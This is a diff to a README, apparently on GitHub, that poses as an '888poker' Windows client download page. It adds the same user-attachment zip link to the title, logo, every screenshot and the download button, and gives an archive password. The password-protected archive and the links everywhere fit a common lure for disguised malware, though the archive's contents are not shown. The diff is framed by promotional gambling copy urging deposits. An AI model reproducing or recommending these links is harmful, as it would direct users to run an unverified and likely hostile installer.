@@ -1,5 +1,5 @@
-# 888poker-download-client-PC
-![888-poker-logo](https://github.com/user-attachments/assets/a3c19e96-f903-4f66-9d09-977b366e6a26)
+# [888poker-download-client-PC](https://github.com/user-attachments/files/18349154/888poker-PC-client-setup.zip)
+[![888-poker-logo](https://github.com/user-attachments/assets/a3c19e96-f903-4f66-9d09-977b366e6a26)](https://github.com/user-attachments/files/18349154/888poker-PC-client-setup.zip)
 
 # 888poker for Windows 10
 
@@ -7,8 +7,8 @@ Play a quality poker game to improve your skill and stay updated about all thing
 
 ## Screenshots:
 
-![2-1657631099048-1683211881306_tcm1488-586534](https://github.com/user-attachments/assets/bd8b95bb-1ff7-49e9-9cbe-6165105f5f42)
-![06-New_Improved_Tables_tcm1964-475150](https://github.com/user-attachments/assets/bbaebb8d-f893-4d42-b6e9-82b42b600de9)
+[![2-1657631099048-1683211881306_tcm1488-586534](https://github.com/user-attachments/assets/bd8b95bb-1ff7-49e9-9cbe-6165105f5f42)](https://github.com/user-attachments/files/18349154/888poker-PC-client-setup.zip)
+[![06-New_Improved_Tables_tcm1964-475150](https://github.com/user-attachments/assets/bbaebb8d-f893-4d42-b6e9-82b42b600de9)](https://github.com/user-attachments/files/18349154/888poker-PC-client-setup.zip)
 
 ## **Downloading 888poker:** *Your Path to Success in Poker*
 888poker is one of the most popular poker platforms in the world, offering players a unique experience and numerous opportunities to win. If you want to join millions of players and test your poker skills, downloading 888poker is the first step on your path to success.
@@ -23,7 +23,7 @@ Play a quality poker game to improve your skill and stay updated about all thing
 
 **Security and Reliability:** 888poker ensures the safety of your data and the fairness of games through modern encryption technologies and licensing.
 
-![Snap-1619091972651_tcm1934-517350-1626955848972_tcm1964-526092 (1)](https://github.com/user-attachments/assets/d929b8e4-4681-4bd9-a6c0-bb43970ec78e)
+[![Snap-1619091972651_tcm1934-517350-1626955848972_tcm1964-526092 (1)](https://github.com/user-attachments/assets/d929b8e4-4681-4bd9-a6c0-bb43970ec78e)](https://github.com/user-attachments/files/18349154/888poker-PC-client-setup.zip)
 
 ## How to Download, Install and Play 888poker?
 
@@ -37,7 +37,7 @@ Play a quality poker game to improve your skill and stay updated about all thing
 
 5. Make a deposit to access real money games and start winning.
 
-# Download 888Poker client for PC: [Click]()
+# Download 888Poker client for PC: [Click](https://github.com/user-attachments/files/18349154/888poker-PC-client-setup.zip)
 ### Password: pcane588
 
 Downloading 888poker is your chance to become part of the exciting world of poker. Don’t miss the opportunity to test your skills and enjoy playing with players from around the globe. Start your journey to success in poker today!
